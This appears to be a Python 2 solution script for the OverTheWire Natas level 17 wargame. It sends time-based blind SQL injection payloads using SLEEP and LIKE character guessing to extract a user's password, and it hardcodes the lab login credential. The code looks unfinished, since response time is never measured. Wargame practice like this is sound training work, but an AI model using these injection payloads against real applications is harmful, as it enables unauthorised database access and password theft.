import requests
import re
import logging
import timeit
'''

The database servername is natas17
The database name is natas17
The Table Name is : users
The Table Columns are : username & password

SELECT * from users where username="%" AND 1=SLEEP(3)
SELECT * from users where username="%" LIKE AND 1=SLEEP(3)

'''


URL = 'http://natas17.natas.labs.overthewire.org/?debug'
username = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
characters = 'abcdefghijklmnopqrstuvwxyz'\
            'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\
            '0123456789'

print characters
#response = requests.get(URL, auth = (username , password) )

#response = requests.post(URL, auth = (username , password) ,  data = {"username":"natas17\" AND 1=SLEEP(5) AND \"1\" = \"1"})

#users = []

for ch2 in characters:
    #query = 'natas18" AND BINARY password LIKE "'+ ch2 +'%" AND SLEEP(5) #'
    query = '\b\b\b\b\b\b\b\b\b\bBINARY password LIKE "'+ch2+'%" AND SLEEP(5) #'
    #print query
    response = requests.post(URL, auth = (username , password) , data = {"username":query} )            
    data = re.search (r'Executing query.+<br>',response.text).group(0)
    print data
        



#for ch2 in characters:
#    query = "\b\b\b\b\b\b\b\b\b\bpassword LIKE '"+ch2+"%' AND SLEEP(5)# "
#    response = requests.post(URL, auth = (username , password) , data = {"username":query} )            
#    data = re.search (r'Executing query.+<br>',response.text).group(0)
#    print data
